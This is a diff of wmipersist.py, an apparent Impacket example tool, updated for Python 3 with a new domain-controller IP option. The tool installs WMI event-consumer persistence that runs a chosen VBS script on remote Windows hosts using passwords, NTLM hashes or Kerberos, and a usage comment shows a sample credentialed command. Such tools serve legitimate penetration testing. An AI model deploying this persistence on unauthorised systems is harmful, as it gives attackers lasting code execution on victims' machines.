@@ -1,5 +1,5 @@
-#!/usr/bin/python
-# Copyright (c) 2003-2016 CORE Security Technologies
+#!/usr/bin/env python
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -22,7 +22,7 @@
 #	objFile.Close
 #
 #
-# then excute this script this way, VBS will be triggered once
+# then execute this script this way, VBS will be triggered once
 # somebody opens calc.exe:
 #
 #  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC 
@@ -43,7 +43,8 @@
 #
 # Reference for:
 #  DCOM/WMI
-
+from __future__ import division
+from __future__ import print_function
 import sys
 import argparse
 import logging
@@ -66,14 +67,16 @@ class WMIPERSISTENCE:
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
-    def checkError(self, banner, resp):
+    @staticmethod
+    def checkError(banner, resp):
         if resp.GetCallStatus(0) != 0:
             logging.error('%s - ERROR (0x%x)' % (banner, resp.GetCallStatus(0)))
         else:
             logging.info('%s - OK' % banner)
 
     def run(self, addr):
-        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, options.aesKey, oxidResolver = False, doKerberos=options.k)
+        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                              options.aesKey, oxidResolver=False, doKerberos=options.k, kdcHost=options.dc_ip)
 
         iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
         iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
@@ -81,17 +84,21 @@ class WMIPERSISTENCE:
         iWbemLevel1Login.RemRelease()
 
         if self.__options.action.upper() == 'REMOVE':
-            self.checkError( 'Removing ActiveScriptEventConsumer %s'% self.__options.name, 
-                  iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % self.__options.name))
+            self.checkError('Removing ActiveScriptEventConsumer %s' % self.__options.name,
+                            iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % self.__options.name))
 
-            self.checkError( 'Removing EventFilter EF_%s'% self.__options.name,
-                  iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"'% self.__options.name))
+            self.checkError('Removing EventFilter EF_%s' % self.__options.name,
+                            iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"' % self.__options.name))
 
-            self.checkError( 'Removing IntervalTimerInstruction TI_%s'% self.__options.name,
-                  iWbemServices.DeleteInstance('__IntervalTimerInstruction.TimerId="TI_%s"'% self.__options.name))
+            self.checkError('Removing IntervalTimerInstruction TI_%s' % self.__options.name,
+                            iWbemServices.DeleteInstance(
+                                '__IntervalTimerInstruction.TimerId="TI_%s"' % self.__options.name))
 
-            self.checkError( 'Removing FilterToConsumerBinding %s'% self.__options.name,
-                  iWbemServices.DeleteInstance(r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",Filter="__EventFilter.Name=\"EF_%s\""' % (self.__options.name, self.__options.name)))
+            self.checkError('Removing FilterToConsumerBinding %s' % self.__options.name,
+                            iWbemServices.DeleteInstance(
+                                r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",'
+                                r'Filter="__EventFilter.Name=\"EF_%s\""' % (
+                                self.__options.name, self.__options.name)))
         else:
             activeScript ,_ = iWbemServices.GetObject('ActiveScriptEventConsumer')
             activeScript =  activeScript.SpawnInstance()
@@ -147,9 +154,10 @@ class WMIPERSISTENCE:
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
 
-    parser = argparse.ArgumentParser(add_help = True, description = "Creates/Removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.")
+    parser = argparse.ArgumentParser(add_help = True, description = "Creates/Removes a WMI Event Consumer/Filter and "
+                               "link between both to execute Visual Basic based on the WQL filter or timer specified.")
 
     parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -158,9 +166,12 @@ if __name__ == '__main__':
     # A start command
     install_parser = subparsers.add_parser('install', help='installs the wmi event consumer/filter')
     install_parser.add_argument('-name', action='store', required=True, help='event name')
-    install_parser.add_argument('-vbs', type=argparse.FileType('r'), required=True, help='VBS filename containing the script you want to run')
-    install_parser.add_argument('-filter', action='store', required=False, help='the WQL filter string that will trigger the script')
-    install_parser.add_argument('-timer', action='store', required=False, help='the amount of milliseconds after the script will be triggered')
+    install_parser.add_argument('-vbs', type=argparse.FileType('r'), required=True, help='VBS filename containing the '
+                                                                                         'script you want to run')
+    install_parser.add_argument('-filter', action='store', required=False, help='the WQL filter string that will trigger'
+                                                                                ' the script')
+    install_parser.add_argument('-timer', action='store', required=False, help='the amount of milliseconds after the'
+                                                                               ' script will be triggered')
 
     # A stop command
     remove_parser = subparsers.add_parser('remove', help='removes the wmi event consumer/filter')
@@ -170,8 +181,13 @@ if __name__ == '__main__':
 
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
-    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
+                       'ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
+                                                                            '(128 or 256 bits)')
+    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                       'ommited it use the domain part (FQDN) specified in the target parameter')
  
     if len(sys.argv)==1:
         parser.print_help()
@@ -182,6 +198,8 @@ if __name__ == '__main__':
         
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
 
@@ -192,7 +210,9 @@ if __name__ == '__main__':
             sys.exit(1)
 
     import re
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
+
+    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+        options.target).groups('')
 
     #In case the password contains '@'
     if '@' in address:
@@ -212,8 +232,9 @@ if __name__ == '__main__':
 
         executer = WMIPERSISTENCE(username, password, domain, options)
         executer.run(address)
-    except (Exception, KeyboardInterrupt), e:
-        #import traceback
-        #print traceback.print_exc()
+    except (Exception, KeyboardInterrupt) as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
         logging.error(e)
     sys.exit(0)
